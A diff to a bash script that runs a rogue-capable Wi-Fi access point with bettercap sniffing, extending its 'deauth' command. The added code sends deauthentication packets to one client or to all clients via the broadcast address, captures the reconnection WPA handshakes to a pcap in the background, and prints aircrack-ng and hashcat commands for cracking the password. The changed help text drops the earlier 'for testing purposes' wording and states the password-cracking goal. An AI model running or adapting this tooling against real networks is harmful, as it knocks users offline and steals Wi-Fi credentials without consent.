@@ -20,6 +20,7 @@ HOSTAPD_LOG="$RUNTIME/hostapd.log"
 BETTERCAP_LOG="$RUNTIME/bettercap.log"
 BETTERCAP_PCAP_DIR="$RUNTIME/sniff"
 BETTERCAP_PID="$RUNTIME/bettercap.pid"
+HANDSHAKE_DIR="$RUNTIME/handshakes"
 
 # Set during start by prompt_security()
 SECURITY_MODE="${SECURITY_MODE:-open}"   # "open" or "wpa2"
@@ -32,7 +33,7 @@ print_help() {
 Usage:
   sudo $SCRIPT_NAME start
   sudo $SCRIPT_NAME stop
-  sudo $SCRIPT_NAME deauth [MAC] [count]
+  sudo $SCRIPT_NAME deauth [MAC] [count] [capture]
   sudo $SCRIPT_NAME help
   sudo $SCRIPT_NAME -h | --help
 
@@ -40,7 +41,8 @@ Description:
   Brings up a Wi-Fi AP on \$AP_IF and NATs traffic out via \$INTERNET_IF.
   Runs hostapd + dnsmasq and starts bettercap packet capture (pcap in: $BETTERCAP_PCAP_DIR).
   On 'start' you'll be asked whether to secure the AP with WPA2-PSK.
-  The 'deauth' command can disconnect clients from the AP (for testing purposes).
+  The 'deauth' command can disconnect clients from the AP and optionally capture
+  authentication handshakes for later password cracking attempts.
 
 Current defaults:
   INTERNET_IF=$INTERNET_IF
@@ -64,6 +66,7 @@ Examples:
   sudo $SCRIPT_NAME deauth                # Interactive mode
   sudo $SCRIPT_NAME deauth FF:FF:FF:FF:FF:FF  # Deauth all clients
   sudo $SCRIPT_NAME deauth 00:11:22:33:44:55 10  # Deauth specific client with 10 packets
+  sudo $SCRIPT_NAME deauth FF:FF:FF:FF:FF:FF 5 true  # Deauth all and capture handshakes
 
 Notes:
   - Requires: hostapd, dnsmasq, iptables, ip, sysctl, bettercap
@@ -195,6 +198,7 @@ stop_bettercap() {
 deauth_clients() {
   local target_mac="${1:-}"
   local deauth_count="${2:-5}"
+  local capture_handshake="${3:-false}"
   
   # Validate the AP is running
   if ! pgrep hostapd >/dev/null; then
@@ -237,6 +241,37 @@ deauth_clients() {
         exit 1
         ;;
     esac
+    
+    # Ask about handshake capture
+    read -r -p "Capture authentication handshake after deauth? [y/N]: " capture_ans
+    capture_ans="${capture_ans,,}"  # lowercase
+    if [[ "$capture_ans" == "y" || "$capture_ans" == "yes" ]]; then
+      capture_handshake=true
+    fi
+  fi
+  
+  # If capturing handshakes, start monitoring before deauth
+  local handshake_file=""
+  local monitor_pid=""
+  
+  if [[ "$capture_handshake" == "true" ]]; then
+    echo "Setting up handshake capture..."
+    mkdir -p "$HANDSHAKE_DIR"
+    local ts="$(date +%Y%m%d-%H%M%S)"
+    handshake_file="$HANDSHAKE_DIR/handshake-$ts.pcap"
+    
+    # Start bettercap in handshake capture mode in background
+    echo "Starting handshake capture on $AP_IF (will save to $handshake_file)"
+    
+    # Launch bettercap with wifi.recon to capture handshakes
+    nohup bettercap -iface "$AP_IF" -no-colors -silent \
+      -eval "set wifi.interface $AP_IF; set net.sniff.output $handshake_file; set net.sniff.filter 'ether proto 0x888e or wlan type mgt subtype beacon or wlan type mgt subtype probe-resp or wlan type mgt subtype assoc-req or wlan type mgt subtype assoc-resp or wlan type mgt subtype reassoc-req or wlan type mgt subtype reassoc-resp or wlan type mgt subtype auth'; wifi.recon on; net.sniff on" \
+      > /dev/null 2>&1 &
+    
+    monitor_pid=$!
+    echo "Handshake monitoring started (PID: $monitor_pid)"
+    # Give it a moment to initialize
+    sleep 2
   fi
   
   echo "Sending $deauth_count deauth packets to $target_mac..."
@@ -245,6 +280,44 @@ deauth_clients() {
   bettercap -iface "$AP_IF" -no-colors -silent -eval "set wifi.interface $AP_IF; wifi.deauth $target_mac $deauth_count"
   
   echo "Deauthentication complete."
+  
+  # If we're capturing handshakes, wait for reconnection attempts
+  if [[ "$capture_handshake" == "true" && -n "$monitor_pid" ]]; then
+    echo ""
+    echo "Listening for handshakes... (CTRL+C to stop)"
+    echo "Capturing to: $handshake_file"
+    echo ""
+    
+    # Wait for handshakes (let user decide when to stop with CTRL+C)
+    local capture_duration=30
+    echo "Will automatically stop capturing after $capture_duration seconds..."
+    
+    # Show a countdown timer
+    for (( i=$capture_duration; i>0; i-- )); do
+      echo -ne "Time remaining: $i seconds\r"
+      sleep 1
+      
+      # Check if monitoring process is still running
+      if ! kill -0 $monitor_pid 2>/dev/null; then
+        echo "Monitoring process terminated unexpectedly."
+        break
+      fi
+    done
+    
+    # Kill the monitoring process
+    if kill -0 $monitor_pid 2>/dev/null; then
+      kill $monitor_pid 2>/dev/null
+      sleep 1
+      kill -9 $monitor_pid 2>/dev/null || true
+    fi
+    
+    echo -e "\nHandshake capture completed."
+    echo "Handshake saved to: $handshake_file"
+    echo ""
+    echo "You can use this file with password cracking tools like:"
+    echo "  aircrack-ng $handshake_file -w <wordlist>"
+    echo "  hashcat -m 22000 $handshake_file <wordlist>"
+  fi
 }
 
 start_ap() {
@@ -326,7 +399,7 @@ case "${1:-}" in
   deauth)
     ensure_root
     check_bins
-    deauth_clients "${2:-}" "${3:-5}"
+    deauth_clients "${2:-}" "${3:-5}" "${4:-false}"
     ;;
   *)
     echo "Usage: sudo $SCRIPT_NAME {start|stop|deauth|help}"
